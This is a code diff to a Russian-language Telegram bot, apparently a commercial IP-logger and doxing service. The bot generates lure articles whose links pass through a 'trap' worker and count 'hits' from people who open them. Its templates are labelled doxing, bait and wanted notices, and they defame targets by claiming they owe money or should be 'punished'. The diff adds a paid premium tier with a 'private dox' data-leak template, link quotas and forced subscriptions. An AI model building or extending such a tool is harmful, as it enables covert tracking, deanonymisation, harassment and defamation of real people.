@@ -21,9 +21,11 @@ LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trap.geminialex12.workers.dev"
 DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
 
-# --- НОВОЕ: Канал для подписки и поддержка ---
-CHANNEL_ID  = -1004336153105 # ID канала "Project" (ссылка +c3xyHely39ozNDyY)
-SUPPORT     = "@boyfrer"
+CHANNEL_ID    = -1004336153105  # ID канала Project
+GROUP_ID      = -1004382024668  # ID группы для проверки подписки
+CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
+GROUP_LINK    = "https://t.me/+c3xyHely39ozNDYy" # ЗАМЕНИ НА ИНВАЙТ В ГРУППУ, ЕСЛИ ОН ДРУГОЙ
+SUPPORT       = "@boyfrer"
 PREMIUM_PRICE = 5.0
 
 # ---------- BOT / TELEGRAPH ----------
@@ -115,6 +117,10 @@ def create_link(slug, title, created_by):
         c.execute("INSERT INTO links (slug,title,created_by,created_at) VALUES (?,?,?,?)",
                   (slug, title, created_by, int(time.time())))
 
+def get_user_links_count(user_id):
+    with _conn() as c:
+        return c.execute("SELECT COUNT(*) FROM links WHERE created_by=?", (user_id,)).fetchone()[0]
+
 def get_user_links(user_id, limit=10):
     with _conn() as c:
         return c.execute("SELECT * FROM links WHERE created_by=? ORDER BY created_at DESC LIMIT ?",
@@ -132,9 +138,17 @@ def get_all_links(limit=20):
 # ---------- UTIL ----------
 def check_sub(user_id):
     try:
-        status = bot.get_chat_member(CHANNEL_ID, user_id).status
-        return status in ["member", "administrator", "creator"]
-    except Exception:
+        status_ch = bot.get_chat_member(CHANNEL_ID, user_id).status
+        if status_ch not in ["member", "administrator", "creator"]:
+            return False
+            
+        status_gr = bot.get_chat_member(GROUP_ID, user_id).status
+        if status_gr not in ["member", "administrator", "creator"]:
+            return False
+            
+        return True
+    except Exception as e:
+        print(f"[!] Ошибка проверки подписки: {e}")
         return False
 
 def send_log(text):
@@ -180,7 +194,7 @@ def make_article(title, text, img_url, template_name, author_id, author_username
 # ---------- MENUS ----------
 def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(types.InlineKeyboardButton("⭐️Наш канал", url='https://t.me/+c3xyHely39ozNDYy'))
+    kb.add(types.InlineKeyboardButton("⭐️Наш канал", url=CHANNEL_LINK))
     kb.add(types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33'))
     kb.add(types.InlineKeyboardButton("📙Профиль", callback_data='cabinet'))
     kb.add(types.InlineKeyboardButton("🌟Создать логгер", callback_data='logger'))
@@ -216,22 +230,23 @@ def cmd_start(message):
         register(uid, username)
         send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
         
-    if not check_sub(uid):
+    if not check_sub(uid) and uid not in ADMIN_IDS:
         kb = types.InlineKeyboardMarkup()
-        kb.add(types.InlineKeyboardButton("📢 Подписаться", url='https://t.me/+c3xyHely39ozNDYy'))
+        kb.add(types.InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_LINK))
+        kb.add(types.InlineKeyboardButton("💬 Вступить в группу", url=GROUP_LINK))
         kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
-        bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на наш канал!</b>", reply_markup=kb)
+        bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на канал и вступи в группу!</b>", reply_markup=kb)
         return
 
     show_main_menu(uid)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'check_sub')
 def cb_check_sub(call):
-    if check_sub(call.from_user.id):
+    if check_sub(call.from_user.id) or call.from_user.id in ADMIN_IDS:
         bot.delete_message(call.message.chat.id, call.message.message_id)
         show_main_menu(call.message.chat.id)
     else:
-        bot.answer_callback_query(call.id, "❌ Ты ещё не подписался!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ Ты подписался не на всё! Проверь канал и группу.", show_alert=True)
 
 # ---------- CALLBACKS ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'home')
@@ -257,11 +272,14 @@ def cb_cabinet(call):
         f"🎯 Хитов: {total_hits}",
         "=============================",
     ]
-    if not is_premium(uid):
+    if is_premium(uid):
+        lines.append("💎 Доступны приватные шаблоны и безлимит ссылок.")
+    else:
         lines.append(f"💎 Купить Premium за {PREMIUM_PRICE}$")
 
     kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton(f"💎 Купить Premium ({PREMIUM_PRICE}$)", callback_data="buy_premium"))
+    if not is_premium(uid):
+        kb.add(types.InlineKeyboardButton(f"💎 Купить Premium ({PREMIUM_PRICE}$)", callback_data="buy_premium"))
     kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
     kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
     try:
@@ -286,7 +304,7 @@ def cb_buy_premium(call):
     add_balance(uid, -PREMIUM_PRICE)
     set_premium(uid)
     bot.answer_callback_query(call.id, "💎 Premium успешно активирован!", show_alert=True)
-    cb_cabinet(call) # обновляем профиль
+    cb_cabinet(call)
 
 # ---------- ADMIN ----------
 @bot.message_handler(commands=['admin'])
@@ -385,14 +403,21 @@ def cb_admin_dump(call):
 # ---------- LOGGER ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'logger')
 def cb_logger(call):
-    if not check_sub(call.from_user.id):
-        bot.answer_callback_query(call.id, "❌ Подпишись на канал!", show_alert=True)
+    if not check_sub(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ Подпишись на канал и группу!", show_alert=True)
         return
+
+    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
+        if get_user_links_count(call.from_user.id) >= 5:
+            bot.answer_callback_query(call.id, "❌ Лимит 5 ссылок! Купи Premium 💎 для безлимита.", show_alert=True)
+            return
 
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(types.InlineKeyboardButton("📙Д0xing", callback_data="cat_dox"))
     kb.add(types.InlineKeyboardButton("📙Байты", callback_data="cat_bait"))
     kb.add(types.InlineKeyboardButton("📙Розыски", callback_data="cat_wanted"))
+    if is_premium(call.from_user.id) or call.from_user.id in ADMIN_IDS:
+        kb.add(types.InlineKeyboardButton("💎 Приватные схемы", callback_data="cat_private"))
     kb.add(types.InlineKeyboardButton("📙Свой текст", callback_data="tpl_custom"))
     kb.add(types.InlineKeyboardButton("⭐️Главное меню", callback_data="home"))
     with open('had2.jpg', 'rb') as had:
@@ -408,6 +433,7 @@ TEMPLATES = {
     "tpl_mvd_v1": "Розыск МВД V1", "tpl_mvd_v2": "Розыск МВД V2",
     "tpl_sport_v1": "СпортОтряд V1", "tpl_sport_v2": "СпортОтряд V2",
     "tpl_money_v1": "Заработок V1", "tpl_money_v2": "Заработок V2",
+    "tpl_priv_v1": "💎 Приватный Dox V1",
 }
 
 TEXTS = {
@@ -423,6 +449,7 @@ TEXTS = {
     "tpl_sport_v2": "Личность {title} задолжала людям денег. Просьба отыскать и наказать. Вознаграждение 40.000р.",
     "tpl_money_v1": "Связка TikTok+YouTube: как монетизировать каналы на развлекательном контенте. {title} — лох.",
     "tpl_money_v2": "Крипто-пираты: заработок на seed-фразах. 1000$ в месяц. {title} — лох.",
+    "tpl_priv_v1": "ПРИВАТНЫЙ СЛИВ ДАННЫХ ЛИЧНОСТИ {title}. Данный текст доступен только Premium пользователям. Его данные: ...",
 }
 
 @bot.callback_query_handler(func=lambda c: c.data in ("cat_dox", "cat_bait", "cat_wanted"))
@@ -439,6 +466,18 @@ def cb_cat(call):
     kb.add(types.InlineKeyboardButton("❌Назад", callback_data="logger"))
     bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              caption="<b>⭐️Выберите шаблон:</b>", reply_markup=kb)
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda c: c.data == "cat_private")
+def cb_cat_private(call):
+    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ Это для Premium!", show_alert=True)
+        return
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(types.InlineKeyboardButton(TEMPLATES["tpl_priv_v1"], callback_data="tpl_priv_v1"))
+    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="logger"))
+    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
+                             caption="<b>💎 Приватные шаблоны:</b>", reply_markup=kb)
     bot.answer_callback_query(call.id)
 
 _pending = {}
